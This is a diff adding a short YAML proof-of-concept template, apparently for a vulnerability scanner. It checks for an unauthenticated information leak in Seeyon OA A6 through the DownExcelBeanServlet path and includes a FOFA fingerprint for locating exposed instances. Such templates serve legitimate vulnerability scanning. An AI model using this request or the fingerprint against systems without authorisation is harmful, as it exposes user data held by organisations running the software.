@@ -1,0 +1,14 @@
+id: poc-yaml-seeyon-downexcelbeanservlet-jsp-information-leakage
+info:
+  name: 致远OA A6 DownExcelBeanServlet 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 致远互联-OA
+  fofa: title="致远A8+协同管理软件.A6"
+requests:
+- method: GET
+  path: /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
+  expression: status_code == 200 && contains(headers,"attachment") && contains(headers,"application/x-msdownload")
+variables: {}
+transport: http
